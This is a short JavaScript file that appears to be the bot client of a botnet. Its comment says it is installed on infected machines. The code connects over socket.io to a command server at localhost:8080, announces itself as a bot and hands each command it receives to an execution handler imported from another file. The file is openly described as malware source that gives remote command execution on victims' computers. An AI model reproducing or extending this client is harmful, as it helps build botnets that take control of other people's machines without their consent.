/*The client is installed on infected machines. It connects to a command server from which it receives commands. 
The client reports to the server once the command has terminated. */

import { io } from "socket.io-client";
import { executeCommand } from "./commands-handler.js";

export const socket = io("http://localhost:8080", { query: { role: "bot" } });

socket.on("execute-command", (command) => {
  executeCommand(command);
});
